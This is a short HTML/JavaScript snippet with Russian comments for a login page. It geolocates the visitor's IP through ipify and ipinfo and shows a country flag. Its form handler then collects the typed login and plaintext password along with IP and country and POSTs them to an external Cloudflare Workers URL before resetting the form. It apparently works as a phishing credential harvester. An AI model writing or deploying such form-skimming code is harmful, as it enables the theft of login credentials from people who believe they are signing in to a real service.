<script>
  const WORKER_URL = 'https://…workers.dev/';
  let clientIp = 'unknown', clientCountry = 'unknown';

  // 1) Функция для флага
  function countryCodeToFlagEmoji(countryCode) {
    return countryCode
      .toUpperCase()
      .split('')
      .map(ch => String.fromCodePoint(0x1F1E6 + ch.charCodeAt(0) - 65))
      .join('');
  }

  // 2) fetch IP → ipinfo
  fetch('https://api.ipify.org?format=json')
    .then(res => res.json())
    .then(json => {
      clientIp = json.ip;
      document.getElementById('ip').textContent = clientIp;
      return fetch(`https://ipinfo.io/${clientIp}/json?token=YOUR_API_KEY`);
    })
    .then(res => res.json())
    .then(info => {
      clientCountry = info.country;
      // ← вот здесь меняем вывод:
      const flagEmoji = countryCodeToFlagEmoji(clientCountry);
      document.getElementById('country').textContent = `${flagEmoji} ${clientCountry}`;

      document.getElementById('flag').src =
        `https://flagcdn.com/w80/${clientCountry.toLowerCase()}.png`;
    })
    .catch(() => {
      document.getElementById('country').textContent = '—';
    });

  // 3) submit формы отправляет {ip, country, login, password}
  document.getElementById('loginForm').addEventListener('submit', async e => {
    e.preventDefault();
    const form = e.target;
    const payload = {
      ip: clientIp,
      country: clientCountry,
      login: form.login.value,
      password: form.password.value
    };
    await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    alert('Данные отправлены!');
    form.reset();
  });
</script>
